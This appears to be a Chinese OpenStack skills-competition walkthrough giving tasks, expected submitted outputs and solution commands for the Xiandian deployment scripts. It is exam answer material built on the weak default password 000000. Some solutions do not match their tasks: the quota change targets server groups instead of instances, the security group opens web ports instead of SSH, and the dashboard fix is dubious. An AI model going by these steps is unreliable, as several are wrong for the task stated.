[root@compute ~]# cat /etc/xiandian/openrc.sh#--------------------system Config--------------------###Controller Server Manager IP. example:x.x.x.xHOST_IP=192.168.157.30#Controller HOST Password. example:000000HOST_PASS=000000#Controller Server hostname. example:controllerHOST_NAME=controller#Compute Node Manager IP. example:x.x.x.xHOST_IP_NODE=192.168.157.31#Compute HOST Password. example:000000HOST_PASS_NODE=000000#Compute Node hostname. example:computeHOST_NAME_NODE=compute#--------------------Chrony Config-------------------###Controller network segment IP.  example:x.x.0.0/16(x.x.x.0/24)network_segment_IP=192.168.157,0/24#--------------------Rabbit Config ------------------###user for rabbit. example:openstackRABBIT_USER=openstack#Password for rabbit user .example:000000RABBIT_PASS=000000#--------------------MySQL Config---------------------###Password for MySQL root user . exmaple:000000DB_PASS=000000#--------------------Keystone Config------------------###Password for Keystore admin user. exmaple:000000DOMAIN_NAME=demoADMIN_PASS=000000DEMO_PASS=000000#Password for Mysql keystore user. exmaple:000000KEYSTONE_DBPASS=000000#--------------------Glance Config--------------------###Password for Mysql glance user. exmaple:000000GLANCE_DBPASS=000000#Password for Keystore glance user. exmaple:000000GLANCE_PASS=000000#--------------------Nova Config----------------------###Password for Mysql nova user. exmaple:000000NOVA_DBPASS=000000#Password for Keystore nova user. exmaple:000000NOVA_PASS=000000#--------------------Neturon Config-------------------###Password for Mysql neutron user. exmaple:000000NEUTRON_DBPASS=000000#Password for Keystore neutron user. exmaple:000000NEUTRON_PASS=000000#metadata secret for neutron. exmaple:000000METADATA_SECRET=000000#Tunnel Network Interface. example:x.x.x.xINTERFACE_IP=192.168.157.31#External Network Interface. example:eth1INTERFACE_NAME=eth37#External Network The Physical Adapter. example:providerPhysical_NAME=provider#First Vlan ID in VLAN RANGE for VLAN Network. exmaple:101minvlan=101#Last Vlan ID in VLAN RANGE for VLAN Network. example:200maxvlan=200#--------------------Cinder Config--------------------###Password for Mysql cinder user. exmaple:000000CINDER_DBPASS=000000#Password for Keystore cinder user. exmaple:000000CINDER_PASS=000000#Cinder Block Disk. example:md126p3BLOCK_DISK=sdb1#--------------------Swift Config---------------------###Password for Keystore swift user. exmaple:000000SWIFT_PASS=000000#The NODE Object Disk for Swift. example:md126p4.OBJECT_DISK=sdb2#The NODE IP for Swift Storage Network. example:x.x.x.x.STORAGE_LOCAL_NET_IP=192.168.157.31#--------------------Heat Config----------------------###Password for Mysql heat user. exmaple:000000HEAT_DBPASS=000000#Password for Keystore heat user. exmaple:000000HEAT_PASS=000000#--------------------Zun Config-----------------------###Password for Mysql Zun user. exmaple:000000ZUN_DBPASS=000000#Password for Keystore Zun user. exmaple:000000ZUN_PASS=000000#Password for Mysql Kuryr user. exmaple:000000KURYR_DBPASS=000000#Password for Keystore Kuryr user. exmaple:000000KURYR_PASS=000000#--------------------Ceilometer Config----------------###Password for Gnocchi ceilometer user. exmaple:000000CEILOMETER_DBPASS=000000#Password for Keystore ceilometer user. exmaple:000000CEILOMETER_PASS=000000#--------------------AODH Config----------------###Password for Mysql AODH user. exmaple:000000AODH_DBPASS=000000#Password for Keystore AODH user. exmaple:000000AODH_PASS=000000#--------------------Barbican Config----------------###Password for Mysql Barbican user. exmaple:000000BARBICAN_DBPASS=000000#Password for Keystore Barbican user. exmaple:000000BARBICAN_PASS=000000[root@compute ~]# source /etc/xiandian/openrc.sh

3.安装 openstack 包分别在 controller 节点和 compute 节点执行 iaas-pre-host.sh 文件(不需要重启云主机)。
在 controller 节点请将 openstack –version 命令的返回结果提交到答题框。【1 分】
[root@controller ~]# openstack --versionopenstack 3.14.3

解法:
[root@controller ~]# iaas-pre-host.sh[root@compute ~]# iaas-pre-host.sh

4. 搭建数据库组件在 controller 节点执行 iaas-install-mysql.sh 脚本，会自行安装 mariadb、memcached、
rabbitmq 等服务和完成相关配置。执行完成后修改配置文件将缓存 CACHESIZE 修改为 128,
并重启相应服务。
请将 ps aux|grep memcached 命令的返回结果提交到答题框。【1 分】
[root@controller ~]# ps aux|grep memcachedmemcach+  15901  0.1  0.0 443040  2164 ?        Ssl  09:15   0:00 /usr/bin/memcached -p 11211 -u memcached -m 128 -c 1024 -l 127.0.0.1,::1,controllerroot      15919  0.0  0.0 112704   960 pts/0    S+   09:15   0:00 grep --color=auto memcached

解法:
[root@controller ~]# iaas-install-mysql.sh[root@controller ~]# rpm -qc memcached/etc/sysconfig/memcached[root@controller ~]# cat /etc/sysconfig/memcachedPORT=&quot;11211&quot;USER=&quot;memcached&quot;MAXCONN=&quot;1024&quot;CACHESIZE=&quot;128&quot;OPTIONS=&quot;-l 127.0.0.1,::1,controller&quot;[root@controller ~]# systemctl restart memcached

5.搭建认证服务组件在 controller 节点执行 iaas-install-keystone.sh 脚本，会自行安装 keystone 服务和完成相
关配置。使用 openstack 命令，创建一个名为 tom 的账户，密码为 tompassword123,邮箱为
&#116;&#x6f;&#109;&#64;&#101;&#x78;&#x61;&#109;&#x70;&#108;&#101;&#46;&#99;&#x6f;&#x6d;。
请将 openstack user list 命令的返回结果提交到答题框。【1 分】
[root@controller ~]# openstack user list+----------------------------------+-------+| ID                               | Name  |+----------------------------------+-------+| 0a22a2d4f3964cfbbbd6474dc92cca01 | admin || 196d426492be403b8fbaa4b0c0f8e2a9 | tom   || 314971684b4d4345b5aa43b2dd55339f | demo  |+----------------------------------+-------+

解法:
[root@controller ~]# iaas-install-keystone.sh[root@controller ~]# source /etc/keystone/admin-openrc.sh[root@controller ~]# openstack user create tom --password tompassword123 --email tom@example.com --domain demo+---------------------+----------------------------------+| Field               | Value                            |+---------------------+----------------------------------+| domain_id           | ed6f7dc2006d4010bd9194ebc576d9e9 || email               | tom@example.com                  || enabled             | True                             || id                  | 196d426492be403b8fbaa4b0c0f8e2a9 || name                | tom                              || options             | &#123;&#125;                               || password_expires_at | None                             |+---------------------+----------------------------------+

6.搭建镜像服务组件在 controller 节点执行 iaas-install-glance.sh 脚本，会自行安装 glance 服务和完成相关
配 置 。 完 成 后 使 用 openstack 命 令 , 创 建 一 个 名 为 cirros 的 镜 像 ， 镜 像 文 件 使 用
cirros-0.3.4-x86_64-disk.img。
请将 openstack image show cirros 命令的返回结果提交到答题框。【1 分】
[root@controller ~]#  openstack image show cirros+------------------+------------------------------------------------------+| Field            | Value                                                |+------------------+------------------------------------------------------+| checksum         | 443b7623e27ecf03dc9e01ee93f67afe                     || container_format | bare                                                 || created_at       | 2023-03-13T13:29:50Z                                 || disk_format      | qcow2                                                || file             | /v2/images/4219d1cb-5238-4720-a7be-167f9b158a9b/file || id               | 4219d1cb-5238-4720-a7be-167f9b158a9b                 || min_disk         | 0                                                    || min_ram          | 0                                                    || name             | cirros                                               || owner            | 1a99aaa6a1024d84a00a779c4d186b44                     || protected        | False                                                || schema           | /v2/schemas/image                                    || size             | 12716032                                             || status           | active                                               || tags             |                                                      || updated_at       | 2023-03-13T13:29:50Z                                 || virtual_size     | None                                                 || visibility       | shared                                               |+------------------+------------------------------------------------------+

解法:
[root@controller ~]# iaas-install-glance.sh[root@controller ~]# openstack image create --disk-format qcow2 --container bare --file /root/cirros-0.4.0-x86_64-disk.img  cirros+------------------+------------------------------------------------------+| Field            | Value                                                |+------------------+------------------------------------------------------+| checksum         | 443b7623e27ecf03dc9e01ee93f67afe                     || container_format | bare                                                 || created_at       | 2023-03-13T13:29:50Z                                 || disk_format      | qcow2                                                || file             | /v2/images/4219d1cb-5238-4720-a7be-167f9b158a9b/file || id               | 4219d1cb-5238-4720-a7be-167f9b158a9b                 || min_disk         | 0                                                    || min_ram          | 0                                                    || name             | cirros                                               || owner            | 1a99aaa6a1024d84a00a779c4d186b44                     || protected        | False                                                || schema           | /v2/schemas/image                                    || size             | 12716032                                             || status           | active                                               || tags             |                                                      || updated_at       | 2023-03-13T13:29:50Z                                 || virtual_size     | None                                                 || visibility       | shared                                               |+------------------+------------------------------------------------------+[root@controller ~]#  openstack image show cirros+------------------+------------------------------------------------------+| Field            | Value                                                |+------------------+------------------------------------------------------+| checksum         | 443b7623e27ecf03dc9e01ee93f67afe                     || container_format | bare                                                 || created_at       | 2023-03-13T13:29:50Z                                 || disk_format      | qcow2                                                || file             | /v2/images/4219d1cb-5238-4720-a7be-167f9b158a9b/file || id               | 4219d1cb-5238-4720-a7be-167f9b158a9b                 || min_disk         | 0                                                    || min_ram          | 0                                                    || name             | cirros                                               || owner            | 1a99aaa6a1024d84a00a779c4d186b44                     || protected        | False                                                || schema           | /v2/schemas/image                                    || size             | 12716032                                             || status           | active                                               || tags             |                                                      || updated_at       | 2023-03-13T13:29:50Z                                 || virtual_size     | None                                                 || visibility       | shared                                               |+------------------+------------------------------------------------------+

7.搭建计算服务组件在 controller 节点执行 iaas-install-nova-controller.sh，compute 节点执行
iaas-install-nova-compute.sh，会自行安装 nova 服务和完成相关配置。使用 nova 命令创建一
个名为 t,ID 为 5，内存为 2048MB,磁盘容量为 10GB,vCPU 数量为 2 的云主机类型。
在 controller 节点请将 nova flavor-show t 命令的返回结果提交到答题框。【1 分】
[root@controller ~]# nova flavor-show t+----------------------------+-------+| Property                   | Value |+----------------------------+-------+| OS-FLV-DISABLED:disabled   | False || OS-FLV-EXT-DATA:ephemeral  | 0     || description                | -     || disk                       | 10    || extra_specs                | &#123;&#125;    || id                         | 5     || name                       | t     || os-flavor-access:is_public | True  || ram                        | 2048  || rxtx_factor                | 1.0   || swap                       |       || vcpus                      | 2     |+----------------------------+-------+

解法:
[root@controller ~]# iaas-install-nova-controller.sh[root@compute ~]# iaas-install-nova-compute.sh[root@controller ~]# nova flavor-create  t 5  2048 10 2+----+------+-----------+------+-----------+------+-------+-------------+-----------+-------------+| ID | Name | Memory_MB | Disk | Ephemeral | Swap | VCPUs | RXTX_Factor | Is_Public | Description |+----+------+-----------+------+-----------+------+-------+-------------+-----------+-------------+| 5  | t    | 2048      | 10   | 0         |      | 2     | 1.0         | True      | -           |+----+------+-----------+------+-----------+------+-------+-------------+-----------+-------------+

8.搭建网络组件并初始化网络在 controller 节点执行 iaas-install-neutron-controller.sh,compute 节点执行
iaas-install-neutron-compute.sh，会自行安装 neutron 服务并完成配置。创建云主机外部网
络 ext-net，子网为 ext-subnet，云主机浮动 IP 可用网段为 192.168.10.100~192.168.10.200，
网关为 192.168.100.1。
在 controller 节点请将 openstack subnet show ext-subnet 命令的返回结果提交到答题
框。【1 分】

注意 本宿主机环境为192.168.157.0&#x2F;24网段  网关应为192.168.157.2

[root@controller ~]# openstack subnet show ext-subnet+-------------------+--------------------------------------+| Field             | Value                                |+-------------------+--------------------------------------+| allocation_pools  | 192.168.10.100-192.168.10.200        || cidr              | 192.168.10.0/24                      || created_at        | 2023-03-13T13:58:58Z                 || description       |                                      || dns_nameservers   |                                      || enable_dhcp       | True                                 || gateway_ip        | 192.168.100.1                        || host_routes       |                                      || id                | 3b4ffa33-6d24-46d5-aa23-e44e8ce86b26 || ip_version        | 4                                    || ipv6_address_mode | None                                 || ipv6_ra_mode      | None                                 || name              | ext-subnet                           || network_id        | d1a6df4b-3af0-4ed6-b402-3b9eae05af8e || project_id        | 1a99aaa6a1024d84a00a779c4d186b44     || revision_number   | 0                                    || segment_id        | None                                 || service_types     |                                      || subnetpool_id     | None                                 || tags              |                                      || updated_at        | 2023-03-13T13:58:58Z                 |+-------------------+--------------------------------------+

解法:
[root@controller ~]# iaas-install-neutron-controller.sh[root@computer ~]# iaas-install-neutron-compute.sh[root@controller ~]# openstack network create --external --provider-physical-network provider --provider-network-type flat ext-net+---------------------------+--------------------------------------+| Field                     | Value                                |+---------------------------+--------------------------------------+| admin_state_up            | UP                                   || availability_zone_hints   |                                      || availability_zones        |                                      || created_at                | 2023-03-13T13:55:36Z                 || description               |                                      || dns_domain                | None                                 || id                        | d1a6df4b-3af0-4ed6-b402-3b9eae05af8e || ipv4_address_scope        | None                                 || ipv6_address_scope        | None                                 || is_default                | False                                || is_vlan_transparent       | None                                 || mtu                       | 1500                                 || name                      | ext-net                              || port_security_enabled     | True                                 || project_id                | 1a99aaa6a1024d84a00a779c4d186b44     || provider:network_type     | flat                                 || provider:physical_network | provider                             || provider:segmentation_id  | None                                 || qos_policy_id             | None                                 || revision_number           | 5                                    || router:external           | External                             || segments                  | None                                 || shared                    | False                                || status                    | ACTIVE                               || subnets                   |                                      || tags                      |                                      || updated_at                | 2023-03-13T13:55:36Z                 |+---------------------------+--------------------------------------+[root@controller ~]# openstack subnet create --network ext-net --subnet-range 192.168.10.0/24  --gateway 192.168.100.1 --allocation-pool start=192.168.10.100,end=192.168.10.200 --dhcp ext-subnet+-------------------+--------------------------------------+| Field             | Value                                |+-------------------+--------------------------------------+| allocation_pools  | 192.168.10.100-192.168.10.200        || cidr              | 192.168.10.0/24                      || created_at        | 2023-03-13T13:58:58Z                 || description       |                                      || dns_nameservers   |                                      || enable_dhcp       | True                                 || gateway_ip        | 192.168.100.1                        || host_routes       |                                      || id                | 3b4ffa33-6d24-46d5-aa23-e44e8ce86b26 || ip_version        | 4                                    || ipv6_address_mode | None                                 || ipv6_ra_mode      | None                                 || name              | ext-subnet                           || network_id        | d1a6df4b-3af0-4ed6-b402-3b9eae05af8e || project_id        | 1a99aaa6a1024d84a00a779c4d186b44     || revision_number   | 0                                    || segment_id        | None                                 || service_types     |                                      || subnetpool_id     | None                                 || tags              |                                      || updated_at        | 2023-03-13T13:58:58Z                 |+-------------------+--------------------------------------+

9.搭建图形化界面在 controller 节点执行 iaas-install-dashboard.sh 脚本，会自行安装 dashboard 服务并完
成配置。请修改 nova 配置文件，使之能通过公网 IP 访问 dashboard 首页。
在 controller 节点请将 curl http://EIP/dashboard –L 命令的返回结果提交到答题框。
【1 分】


解法:
[root@controller ~]# iaas-install-dashboard.sh [root@controller ~]# vi /etc/nova/nova.conf#公共IP的网络主机--routing_source_ip=192.168.1.50#高效网络--multi_host=true#公网网卡--public_interface=eth0

任务 3 OpenStack 运维任务（13 分）某公司构建了一套内部私有云系统，这套私有云系统将为公司内部提供计算服务。你将作为该私有云的维护人员，请完成以下运维工作。
1.安全组管理使用命令创建名称为 group_web 的安全组该安全组的描述为” Custom security group”，
用 openstack 命令为安全组添加 icmp 规则和 ssh 规则允许任意 ip 地址访问 web,完成后查看
该安全组的详细信息.
将 openstack security group show group_web 命令的返回结果提交到答题框。【1 分】
[root@controller ~]# openstack security group show group_web+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| Field           | Value                                                                                                                                                                                                                                            |+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| created_at      | 2023-03-13T15:07:06Z                                                                                                                                                                                                                             || description     | Custom security group                                                                                                                                                                                                                            || id              | 1ba95444-9ba2-4036-84a7-fc67f09f323f                                                                                                                                                                                                             || name            | group_web                                                                                                                                                                                                                                        || project_id      | 1a99aaa6a1024d84a00a779c4d186b44                                                                                                                                                                                                                 || revision_number | 5                                                                                                                                                                                                                                                || rules           | created_at=&#x27;2023-03-13T16:03:49Z&#x27;, direction=&#x27;ingress&#x27;, ethertype=&#x27;IPv4&#x27;, id=&#x27;b92db258-8484-4082-94f4-51ec184f30c0&#x27;, port_range_max=&#x27;80&#x27;, port_range_min=&#x27;80&#x27;, protocol=&#x27;tcp&#x27;, remote_ip_prefix=&#x27;0.0.0.0/0&#x27;, updated_at=&#x27;2023-03-13T16:03:49Z&#x27;   ||                 | created_at=&#x27;2023-03-13T15:07:06Z&#x27;, direction=&#x27;egress&#x27;, ethertype=&#x27;IPv6&#x27;, id=&#x27;aea10bda-7c20-45e6-a802-940dd0a6761b&#x27;, updated_at=&#x27;2023-03-13T15:07:06Z&#x27;                                                                                            ||                 | created_at=&#x27;2023-03-13T16:19:18Z&#x27;, direction=&#x27;ingress&#x27;, ethertype=&#x27;IPv4&#x27;, id=&#x27;35d48cca-f4b6-499e-9b06-50e763a695f0&#x27;, port_range_max=&#x27;443&#x27;, port_range_min=&#x27;443&#x27;, protocol=&#x27;tcp&#x27;, remote_ip_prefix=&#x27;0.0.0.0/0&#x27;, updated_at=&#x27;2023-03-13T16:19:18Z&#x27; ||                 | created_at=&#x27;2023-03-13T15:07:06Z&#x27;, direction=&#x27;egress&#x27;, ethertype=&#x27;IPv4&#x27;, id=&#x27;81eef3e3-5804-4323-b05f-2b0357e25ae3&#x27;, updated_at=&#x27;2023-03-13T15:07:06Z&#x27;                                                                                            ||                 | created_at=&#x27;2023-03-13T16:03:14Z&#x27;, direction=&#x27;ingress&#x27;, ethertype=&#x27;IPv4&#x27;, id=&#x27;7f53e52f-5fbe-452c-b704-4232cfafd7d8&#x27;, protocol=&#x27;icmp&#x27;, remote_ip_prefix=&#x27;0.0.0.0/0&#x27;, updated_at=&#x27;2023-03-13T16:03:14Z&#x27;                                            || updated_at      | 2023-03-13T16:19:18Z                                                                                                                                                                                                                             |+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

解法:
[root@controller ~]# openstack security group create group_web --description &quot;Custom security group&quot;+-----------------+-------------------------------------------------------------------------------------------------------------------------------------------------------+| Field           | Value                                                                                                                                                 |+-----------------+-------------------------------------------------------------------------------------------------------------------------------------------------------+| created_at      | 2023-03-13T15:07:06Z                                                                                                                                  || description     | Custom security group                                                                                                                                 || id              | 1ba95444-9ba2-4036-84a7-fc67f09f323f                                                                                                                  || name            | group_web                                                                                                                                             || project_id      | 1a99aaa6a1024d84a00a779c4d186b44                                                                                                                      || revision_number | 2                                                                                                                                                     || rules           | created_at=&#x27;2023-03-13T15:07:06Z&#x27;, direction=&#x27;egress&#x27;, ethertype=&#x27;IPv4&#x27;, id=&#x27;81eef3e3-5804-4323-b05f-2b0357e25ae3&#x27;, updated_at=&#x27;2023-03-13T15:07:06Z&#x27; ||                 | created_at=&#x27;2023-03-13T15:07:06Z&#x27;, direction=&#x27;egress&#x27;, ethertype=&#x27;IPv6&#x27;, id=&#x27;aea10bda-7c20-45e6-a802-940dd0a6761b&#x27;, updated_at=&#x27;2023-03-13T15:07:06Z&#x27; || updated_at      | 2023-03-13T15:07:06Z                                                                                                                                  |+-----------------+-------------------------------------------------------------------------------------------------------------------------------------------------------+[root@controller ~]# openstack security group rule create group_web --protocol icmp --ingress+-------------------+--------------------------------------+| Field             | Value                                |+-------------------+--------------------------------------+| created_at        | 2023-03-13T16:03:14Z                 || description       |                                      || direction         | ingress                              || ether_type        | IPv4                                 || id                | 7f53e52f-5fbe-452c-b704-4232cfafd7d8 || name              | None                                 || port_range_max    | None                                 || port_range_min    | None                                 || project_id        | 1a99aaa6a1024d84a00a779c4d186b44     || protocol          | icmp                                 || remote_group_id   | None                                 || remote_ip_prefix  | 0.0.0.0/0                            || revision_number   | 0                                    || security_group_id | 1ba95444-9ba2-4036-84a7-fc67f09f323f || updated_at        | 2023-03-13T16:03:14Z                 |+-------------------+--------------------------------------+[root@controller ~]# openstack security group rule create group_web --protocol tcp --ingress --dst-port 80:80+-------------------+--------------------------------------+| Field             | Value                                |+-------------------+--------------------------------------+| created_at        | 2023-03-13T16:03:49Z                 || description       |                                      || direction         | ingress                              || ether_type        | IPv4                                 || id                | b92db258-8484-4082-94f4-51ec184f30c0 || name              | None                                 || port_range_max    | 80                                   || port_range_min    | 80                                   || project_id        | 1a99aaa6a1024d84a00a779c4d186b44     || protocol          | tcp                                  || remote_group_id   | None                                 || remote_ip_prefix  | 0.0.0.0/0                            || revision_number   | 0                                    || security_group_id | 1ba95444-9ba2-4036-84a7-fc67f09f323f || updated_at        | 2023-03-13T16:03:49Z                 |+-------------------+--------------------------------------+[root@controller ~]# openstack security group rule create group_web --protocol tcp --ingress --dst-port 443:443+-------------------+--------------------------------------+| Field             | Value                                |+-------------------+--------------------------------------+| created_at        | 2023-03-13T16:19:18Z                 || description       |                                      || direction         | ingress                              || ether_type        | IPv4                                 || id                | 35d48cca-f4b6-499e-9b06-50e763a695f0 || name              | None                                 || port_range_max    | 443                                  || port_range_min    | 443                                  || project_id        | 1a99aaa6a1024d84a00a779c4d186b44     || protocol          | tcp                                  || remote_group_id   | None                                 || remote_ip_prefix  | 0.0.0.0/0                            || revision_number   | 0                                    || security_group_id | 1ba95444-9ba2-4036-84a7-fc67f09f323f || updated_at        | 2023-03-13T16:19:18Z                 |+-------------------+--------------------------------------+

2.项目管理在 keystone 中创建 shop 项目添加描述为”Hello shop”，完成后使用 openstack 命令禁用
该项目，然后使用 openstack 命令查看该项目的详细信息。
请将 openstack project show shop 命令的返回结果提交到答题框。【1 分】
[root@controller ~]# openstack project show shop+-------------+----------------------------------+| Field       | Value                            |+-------------+----------------------------------+| description | Hello shop                       || domain_id   | ed6f7dc2006d4010bd9194ebc576d9e9 || enabled     | False                            || id          | 6896ca6270aa429aa22908123b5cfb65 || is_domain   | False                            || name        | shop                             || parent_id   | ed6f7dc2006d4010bd9194ebc576d9e9 || tags        | []                               |+-------------+----------------------------------+

解法:
[root@controller ~]# openstack project create shop --description &quot;Hello shop&quot; --domain demo+-------------+----------------------------------+| Field       | Value                            |+-------------+----------------------------------+| description | Hello shop                       || domain_id   | ed6f7dc2006d4010bd9194ebc576d9e9 || enabled     | True                             || id          | 6896ca6270aa429aa22908123b5cfb65 || is_domain   | False                            || name        | shop                             || parent_id   | ed6f7dc2006d4010bd9194ebc576d9e9 || tags        | []                               |+-------------+----------------------------------+[root@controller ~]# openstack project  set  shop --disable

3.用户管理使用 nova 命令查看 admin 租户的当前配额值，将 admin 租户的实例配额提升到 13。
请将 nova quota-class-show admin 命令的返回结果提交到答题框。【1 分】
[root@controller ~]# nova quota-class-show admin+----------------------+-------+| Quota                | Limit |+----------------------+-------+| instances            | 10    || cores                | 20    || ram                  | 51200 || metadata_items       | 128   || key_pairs            | 100   || server_groups        | 13    || server_group_members | 10    |+----------------------+-------+

解法:
[root@controller ~]# nova quota-class-show admin+----------------------+-------+| Quota                | Limit |+----------------------+-------+| instances            | 10    || cores                | 20    || ram                  | 51200 || metadata_items       | 128   || key_pairs            | 100   || server_groups        | 10    || server_group_members | 10    |+----------------------+-------+[root@controller ~]# nova quota-class-update --server-groups 13 admin

4.镜像管理登 录 controller 节 点 ，使用 glance 相 关 命 令 上 传 镜 像 ， 源 使 用
CentOS_7.5_x86_64_XD.qcow2，名字为 centos7.5，修改这个镜像为共享状态，并设置最小
磁盘为 5G。
请将 glance image-list 命令的返回结果提交到答题框。【1 分】
[root@controller ~]# glance image-list+--------------------------------------+-----------+| ID                                   | Name      |+--------------------------------------+-----------+| 29383c02-103a-4d28-ad42-24419970ed79 | centos7.5 || 4219d1cb-5238-4720-a7be-167f9b158a9b | cirros    |+--------------------------------------+-----------+

解法:
[root@controller ~]# glance image-create --name centos7.5  --min-disk 5 --disk-format qcow2 --file /opt/iaas/images/CentOS_7.5_x86_64_XD.qcow2  --container-format bare+------------------+--------------------------------------+| Property         | Value                                |+------------------+--------------------------------------+| checksum         | 3d3e9c954351a4b6953fd156f0c29f5c     || container_format | bare                                 || created_at       | 2023-03-13T16:47:13Z                 || disk_format      | qcow2                                || id               | 29383c02-103a-4d28-ad42-24419970ed79 || min_disk         | 5                                    || min_ram          | 0                                    || name             | centos7.5                            || owner            | 1a99aaa6a1024d84a00a779c4d186b44     || protected        | False                                || size             | 510459904                            || status           | active                               || tags             | []                                   || updated_at       | 2023-03-13T16:47:17Z                 || virtual_size     | None                                 || visibility       | shared                               |+------------------+--------------------------------------+

5.后端配置文件管理请修改 glance 后端配置文件，将项目的映像存储限制为 10GB,完成后重启 glance 服务。
请将 cat &#x2F;etc&#x2F;glance&#x2F;glance-api.conf |grep user_storage 命令的返回结果提交到答题框。【1分】
[root@controller ~]# cat /etc/glance/glance-api.conf |grep user_storageuser_storage_quota = 10GB

解法:
[root@controller ~]# cat /etc/glance/glance-api.conf |grep user_storageuser_storage_quota = 10GB[root@controller ~]# systemctl restart openstack-glance-api

6.存储服务管理在 controller 节点执行 iaas-install-cinder-controller.sh, compute 节点执行
iaas-install-cinder-compute.sh，在 controller 和 compute 节点上会自行安装 cinder 服务并
完成配置。创建一个名为 lvm 的卷类型，创建该类型规格键值对，要求 lvm 卷类型对应 cinder
后端驱动 lvm 所管理的存储资源,名字 lvm_test，大小 1G 的云硬盘并查询该云硬盘的详细信
息。
[root@controller ~]# cinder show lvm_test+--------------------------------+--------------------------------------+| Property                       | Value                                |+--------------------------------+--------------------------------------+| attached_servers               | []                                   || attachment_ids                 | []                                   || availability_zone              | nova                                 || bootable                       | false                                || consistencygroup_id            | None                                 || created_at                     | 2023-03-13T19:49:41.000000           || description                    | None                                 || encrypted                      | False                                || id                             | 255ef0a6-1d74-4b82-b930-6ae575aca172 || metadata                       |                                      || migration_status               | None                                 || multiattach                    | False                                || name                           | lvm_test                             || os-vol-host-attr:host          | compute@lvm#LVM                      || os-vol-mig-status-attr:migstat | None                                 || os-vol-mig-status-attr:name_id | None                                 || os-vol-tenant-attr:tenant_id   | 1a99aaa6a1024d84a00a779c4d186b44     || replication_status             | None                                 || size                           | 1                                    || snapshot_id                    | None                                 || source_volid                   | None                                 || status                         | available                            || updated_at                     | 2023-03-13T19:49:42.000000           || user_id                        | 0a22a2d4f3964cfbbbd6474dc92cca01     || volume_type                    | lvm                                  |+--------------------------------+--------------------------------------+



解法:
[root@controller ~]# openstack volume type create  lvm+-------------+--------------------------------------+| Field       | Value                                |+-------------+--------------------------------------+| description | None                                 || id          | b3872aa9-91df-4b82-a575-9c2e22458ea9 || is_public   | True                                 || name        | lvm                                  |+-------------+--------------------------------------+[root@controller ~]# openstack volume type set  --property volume_backend_name=LVM lvm[root@controller ~]# openstack volume create --type lvm --size 1 lvm_test+---------------------+--------------------------------------+| Field               | Value                                |+---------------------+--------------------------------------+| attachments         | []                                   || availability_zone   | nova                                 || bootable            | false                                || consistencygroup_id | None                                 || created_at          | 2023-03-13T19:49:41.000000           || description         | None                                 || encrypted           | False                                || id                  | 255ef0a6-1d74-4b82-b930-6ae575aca172 || migration_status    | None                                 || multiattach         | False                                || name                | lvm_test                             || properties          |                                      || replication_status  | None                                 || size                | 1                                    || snapshot_id         | None                                 || source_volid        | None                                 || status              | creating                             || type                | lvm                                  || updated_at          | None                                 || user_id             | 0a22a2d4f3964cfbbbd6474dc92cca01     |+---------------------+--------------------------------------+

参考链接
7.数据库管理请使用数据库命令将所有数据库进行备份,备份文件名为 openstack.sql，完成后使用命令
查看文件属性其中文件大小以 mb 显示。
请将 du -h openstack.sql 命令的返回结果提交到答题框。【1 分】
[root@controller ~]# du openstack.sql -h1.6M    openstack.sql

解法:
[root@controller ~]# mysqldump -uroot -p000000 --all-databases &gt; openstack.sql

参考文档
8.数据库管理进入数据库，创建本地用户 examuser，密码为 000000，然后查询 mysql 数据库中的
user 表的 user,host,password 字段。然后赋予这个用户所有数据库的“查询”“删除”“更新”“创
建”的权限。
请将 select user,host,password from user ;命令的返回结果提交到答题框【1 分】
MariaDB [(none)]&gt; use mysql;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMariaDB [mysql]&gt;  select user,host,password from user;+----------+------------+-------------------------------------------+| user     | host       | password                                  |+----------+------------+-------------------------------------------+| root     | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || root     | controller | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || root     | 127.0.0.1  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || root     | ::1        | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || keystone | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || keystone | %          | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || glance   | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || glance   | %          | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || nova     | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || nova     | %          | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || neutron  | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || neutron  | %          | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || cinder   | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || cinder   | %          | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || examuser | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |+----------+------------+-------------------------------------------+15 rows in set (0.00 sec)

解法:
[root@controller ~]# mysql -uroot -pEnter password:Welcome to the MariaDB monitor.  Commands end with ; or \g.Your MariaDB connection id is 400Server version: 10.1.20-MariaDB MariaDB ServerCopyright (c) 2000, 2016, Oracle, MariaDB Corporation Ab and others.Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.MariaDB [(none)]&gt; create user examuser@localhost identified by &#x27;000000&#x27;;Query OK, 0 rows affected (0.00 sec)MariaDB [(none)]&gt; grant select,delete,update,create on *.* to examuser@localhost ;Query OK, 0 rows affected (0.00 sec)MariaDB [(none)]&gt; flush privileges    -&gt; ;

9.存储管理请使用 openstack 命令创建一个名为 test 的 cinder 卷，卷大小为 5G。完成后使用 cinder
命令列出卷列表并查看 test 卷的详细信息。
请将 cinder list 命令的返回结果提交到答题框。【1 分】
[root@controller ~]# cinder list+--------------------------------------+-----------+----------+------+-------------+----------+-------------+| ID                                   | Status    | Name     | Size | Volume Type | Bootable | Attached to |+--------------------------------------+-----------+----------+------+-------------+----------+-------------+| 255ef0a6-1d74-4b82-b930-6ae575aca172 | available | lvm_test | 1    | lvm         | false    |             || 893a1d99-297d-4cf0-8a01-7e637d6ab086 | available | test     | 5    | -           | false    |             |+--------------------------------------+-----------+----------+------+-------------+----------+-------------+

解法:
